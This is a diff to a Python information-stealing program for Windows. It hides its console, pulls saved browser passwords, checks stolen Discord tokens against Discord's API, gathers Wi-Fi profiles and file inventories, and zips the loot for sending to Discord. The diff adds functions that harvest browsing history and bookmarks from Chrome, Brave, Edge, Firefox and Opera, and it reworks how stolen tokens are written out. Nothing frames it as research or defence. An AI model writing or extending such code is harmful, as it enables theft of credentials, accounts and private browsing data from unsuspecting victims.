@@ -20,6 +20,7 @@ import platform
 from pathlib import Path
 import random
 import string
+from datetime import timedelta
 
 try:
     import psutil
@@ -55,8 +56,6 @@ try:
     ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
 except:
     pass
-
-FOLDERS = ["Desktop", "Documents", "Downloads", "Pictures", "Music", "Videos"]
 
 OPERA_PATH = os.path.join(LOCAL, "Programs", "Opera", "opera.exe")
 OPERA_GX_PATH = os.path.join(LOCAL, "Programs", "Opera GX", "opera.exe")
@@ -387,6 +386,234 @@ def run_opera_extraction():
                     f.write(f"Username: {pwd['username']}\n")
                     f.write(f"Password: {pwd['password']}\n")
                     f.write("-" * 50 + "\n")
+
+def get_chromium_history(history_path):
+    if not os.path.exists(history_path):
+        return []
+
+    temp_db = os.path.join(TEMP_MAIN, f'history_temp_{os.getpid()}.db')
+    try:
+        shutil.copy2(history_path, temp_db)
+    except:
+        return []
+
+    history = []
+    try:
+        conn = sqlite3.connect(temp_db)
+        cursor = conn.cursor()
+        cursor.execute("""
+            SELECT urls.url, urls.title, urls.last_visit_time, urls.visit_count
+            FROM urls WHERE url IS NOT NULL
+            ORDER BY urls.last_visit_time DESC LIMIT 5000
+        """)
+        for row in cursor.fetchall():
+            url, title, timestamp, visit_count = row
+            if url and timestamp:
+                try:
+                    dt = datetime.datetime(1601, 1, 1) + timedelta(microseconds=timestamp)
+                    date_str = dt.strftime('%Y-%m-%d %H:%M:%S')
+                except:
+                    date_str = "Unknown"
+                history.append({
+                    'title': title or '(No title)',
+                    'url': url,
+                    'last_visit': date_str,
+                    'visit_count': visit_count
+                })
+        conn.close()
+    except:
+        pass
+    try:
+        os.unlink(temp_db)
+    except:
+        pass
+    return history
+
+def get_chromium_bookmarks(bookmarks_path):
+    if not os.path.exists(bookmarks_path):
+        return []
+
+    temp_json = os.path.join(TEMP_MAIN, f'bookmarks_temp_{os.getpid()}.json')
+    try:
+        shutil.copy2(bookmarks_path, temp_json)
+    except:
+        return []
+
+    bookmarks = []
+    try:
+        with open(temp_json, 'r', encoding='utf-8') as f:
+            data = json.load(f)
+        def extract_bookmarks(node, folder_path=""):
+            if 'children' in node:
+                for child in node['children']:
+                    if child.get('type') == 'url':
+                        bookmarks.append({
+                            'name': child.get('name', ''),
+                            'url': child.get('url', ''),
+                            'folder': folder_path if folder_path else 'Root'
+                        })
+                    elif child.get('type') == 'folder':
+                        new_path = f"{folder_path}/{child.get('name', '')}" if folder_path else child.get('name', '')
+                        extract_bookmarks(child, new_path)
+        roots = data.get('roots', {})
+        for root_name, root_node in roots.items():
+            if root_name in ['bookmark_bar', 'other', 'synced']:
+                extract_bookmarks(root_node, root_name)
+    except:
+        pass
+    try:
+        os.unlink(temp_json)
+    except:
+        pass
+    return bookmarks
+
+def get_firefox_history_bookmarks(profile_path):
+    places_db = os.path.join(profile_path, 'places.sqlite')
+    if not os.path.exists(places_db):
+        return [], []
+
+    temp_db = os.path.join(TEMP_MAIN, f'firefox_places_{os.getpid()}.db')
+    try:
+        shutil.copy2(places_db, temp_db)
+    except:
+        return [], []
+
+    history = []
+    bookmarks = []
+    try:
+        conn = sqlite3.connect(temp_db)
+        cursor = conn.cursor()
+        cursor.execute("""
+            SELECT url, title, last_visit_date, visit_count
+            FROM moz_places
+            WHERE last_visit_date IS NOT NULL AND url IS NOT NULL
+            ORDER BY last_visit_date DESC LIMIT 5000
+        """)
+        for row in cursor.fetchall():
+            url, title, timestamp, visit_count = row
+            if url and timestamp:
+                try:
+                    dt = datetime.datetime.fromtimestamp(timestamp / 1000000)
+                    date_str = dt.strftime('%Y-%m-%d %H:%M:%S')
+                except:
+                    date_str = "Unknown"
+                history.append({
+                    'title': title or '(No title)',
+                    'url': url,
+                    'last_visit': date_str,
+                    'visit_count': visit_count
+                })
+        cursor.execute("""
+            SELECT b.title, p.url, parent.title as folder
+            FROM moz_bookmarks b
+            JOIN moz_places p ON b.fk = p.id
+            LEFT JOIN moz_bookmarks parent ON b.parent = parent.id
+            WHERE b.type = 1 AND p.url IS NOT NULL
+        """)
+        for row in cursor.fetchall():
+            title, url, folder = row
+            if url:
+                bookmarks.append({
+                    'name': title or '',
+                    'url': url,
+                    'folder': folder or 'Unsorted'
+                })
+        conn.close()
+    except:
+        pass
+    try:
+        os.unlink(temp_db)
+    except:
+        pass
+    return history, bookmarks
+
+def run_chromium_history_bookmarks():
+    chromium_browsers = [
+        ('Chrome', os.path.join(LOCAL, r'Google\Chrome\User Data\Default')),
+        ('Brave', os.path.join(LOCAL, r'BraveSoftware\Brave-Browser\User Data\Default')),
+        ('Edge', os.path.join(LOCAL, r'Microsoft\Edge\User Data\Default')),
+    ]
+    for browser_name, profile_dir in chromium_browsers:
+        if not os.path.exists(profile_dir):
+            continue
+        history_path = os.path.join(profile_dir, 'History')
+        bookmarks_path = os.path.join(profile_dir, 'Bookmarks')
+        browser_output = os.path.join(BROWSERS_DIR, browser_name)
+        os.makedirs(browser_output, exist_ok=True)
+        history = get_chromium_history(history_path)
+        if history:
+            with open(os.path.join(browser_output, 'history.txt'), 'w', encoding='utf-8') as f:
+                for entry in history:
+                    f.write(f"Title: {entry['title']}\n")
+                    f.write(f"URL: {entry['url']}\n")
+                    f.write(f"Last Visit: {entry['last_visit']}\n")
+                    f.write(f"Visit Count: {entry['visit_count']}\n")
+                    f.write("-" * 60 + "\n")
+        bookmarks = get_chromium_bookmarks(bookmarks_path)
+        if bookmarks:
+            with open(os.path.join(browser_output, 'bookmarks.txt'), 'w', encoding='utf-8') as f:
+                for entry in bookmarks:
+                    f.write(f"Name: {entry['name']}\n")
+                    f.write(f"URL: {entry['url']}\n")
+                    f.write(f"Folder: {entry['folder']}\n")
+                    f.write("-" * 60 + "\n")
+
+def run_firefox_history_bookmarks():
+    firefox_profiles = get_firefox_profiles()
+    if not firefox_profiles:
+        return
+    firefox_output = os.path.join(BROWSERS_DIR, 'Firefox')
+    for profile_path in firefox_profiles:
+        profile_name = os.path.basename(profile_path)
+        profile_output = os.path.join(firefox_output, profile_name)
+        history, bookmarks = get_firefox_history_bookmarks(profile_path)
+        if history or bookmarks:
+            os.makedirs(profile_output, exist_ok=True)
+            if history:
+                with open(os.path.join(profile_output, 'history.txt'), 'w', encoding='utf-8') as f:
+                    for entry in history:
+                        f.write(f"Title: {entry['title']}\n")
+                        f.write(f"URL: {entry['url']}\n")
+                        f.write(f"Last Visit: {entry['last_visit']}\n")
+                        f.write(f"Visit Count: {entry['visit_count']}\n")
+                        f.write("-" * 60 + "\n")
+            if bookmarks:
+                with open(os.path.join(profile_output, 'bookmarks.txt'), 'w', encoding='utf-8') as f:
+                    for entry in bookmarks:
+                        f.write(f"Name: {entry['name']}\n")
+                        f.write(f"URL: {entry['url']}\n")
+                        f.write(f"Folder: {entry['folder']}\n")
+                        f.write("-" * 60 + "\n")
+
+def run_opera_history_bookmarks():
+    opera_configs = [
+        ('Opera', os.path.join(ROAMING, r'Opera Software\Opera Stable\Default')),
+        ('Opera_GX', os.path.join(ROAMING, r'Opera Software\Opera GX Stable\Default')),
+    ]
+    for browser_name, profile_dir in opera_configs:
+        if not os.path.exists(profile_dir):
+            continue
+        history_path = os.path.join(profile_dir, 'History')
+        bookmarks_path = os.path.join(profile_dir, 'Bookmarks')
+        browser_output = os.path.join(BROWSERS_DIR, browser_name)
+        os.makedirs(browser_output, exist_ok=True)
+        history = get_chromium_history(history_path)
+        if history:
+            with open(os.path.join(browser_output, 'history.txt'), 'w', encoding='utf-8') as f:
+                for entry in history:
+                    f.write(f"Title: {entry['title']}\n")
+                    f.write(f"URL: {entry['url']}\n")
+                    f.write(f"Last Visit: {entry['last_visit']}\n")
+                    f.write(f"Visit Count: {entry['visit_count']}\n")
+                    f.write("-" * 60 + "\n")
+        bookmarks = get_chromium_bookmarks(bookmarks_path)
+        if bookmarks:
+            with open(os.path.join(browser_output, 'bookmarks.txt'), 'w', encoding='utf-8') as f:
+                for entry in bookmarks:
+                    f.write(f"Name: {entry['name']}\n")
+                    f.write(f"URL: {entry['url']}\n")
+                    f.write(f"Folder: {entry['folder']}\n")
+                    f.write("-" * 60 + "\n")
 
 def run_xaitax_extractor():
     temp_dir = tempfile.mkdtemp()
@@ -763,13 +990,11 @@ def validate_token(token):
         response = requests.get('https://discord.com/api/v9/users/@me', headers=headers, timeout=10)
         if response.status_code == 200:
             user_data = response.json()
-            username = user_data.get('username', 'Unknown')
             user_id = user_data.get('id', 'Unknown')
-            email = user_data.get('email', 'Not visible')
-            return True, username, user_id, email
-        return False, None, None, None
+            return True, user_id
+        return False, None
     except:
-        return False, None, None, None
+        return False, None
 
 def get_discord_tokens():
     all_valid_tokens = []
@@ -789,13 +1014,11 @@ def get_discord_tokens():
                 all_tokens[token].append(source)
 
     for token, sources in all_tokens.items():
-        is_valid, username, user_id, email = validate_token(token)
+        is_valid, user_id = validate_token(token)
         if is_valid:
             all_valid_tokens.append({
                 'token': token,
-                'username': username,
                 'user_id': user_id,
-                'email': email,
                 'sources': sources
             })
     return all_valid_tokens
@@ -849,23 +1072,16 @@ def get_all_wifi_profiles():
     except:
         return []
 
-def format_file_info(path):
-    try:
-        stat = path.stat()
-        return f"{path}\n  Size: {stat.st_size} bytes\n  Modified: {datetime.datetime.fromtimestamp(stat.st_mtime)}\n"
-    except:
-        return f"{path}\n  [Access Denied]\n"
-
 def collect_file_inventory():
     home = Path.home()
     output = []
-    
+
     folders = ["Desktop", "Downloads", "Documents", "Pictures", "Music", "Videos"]
-    
+
     for folder in folders:
         folder_path = home / folder
         output.append(f"\n{'='*60}\n{folder.upper()}\n{'='*60}\n")
-        
+
         if folder_path.exists():
             try:
                 for item in folder_path.rglob("*"):
@@ -878,14 +1094,14 @@ def collect_file_inventory():
                 output.append(f"Access denied: {folder}\n")
         else:
             output.append(f"Folder not found: {folder}\n")
-    
+
     if output:
         inventory_file = os.path.join(BASE_OUTPUT_DIR, "file_inventory.txt")
         with open(inventory_file, 'w', encoding='utf-8') as f:
             f.write("\n".join(output))
         return inventory_file
     return None
-    
+
 def send_zip_to_discord(zip_path):
     if not os.path.exists(zip_path):
         return False
@@ -903,6 +1119,10 @@ def main():
     run_xaitax_extractor()
     run_firefox_extraction()
     run_opera_extraction()
+
+    run_chromium_history_bookmarks()
+    run_firefox_history_bookmarks()
+    run_opera_history_bookmarks()
 
     ip_info = get_ip_info()
     if ip_info:
@@ -931,10 +1151,8 @@ def main():
         discord_file = os.path.join(BASE_OUTPUT_DIR, "discord_tokens.txt")
         with open(discord_file, 'w', encoding='utf-8') as f:
             for token_info in discord_tokens:
-                f.write(f"Username: {token_info['username']}\n")
-                f.write(f"User ID: {token_info['user_id']}\n")
-                f.write(f"Email: {token_info['email']}\n")
                 f.write(f"Token: {token_info['token']}\n")
+                f.write(f"User ID: {token_info['user_id']}\n")
                 f.write(f"Sources: {', '.join(token_info['sources'])}\n")
                 f.write(f"{'='*60}\n")
 
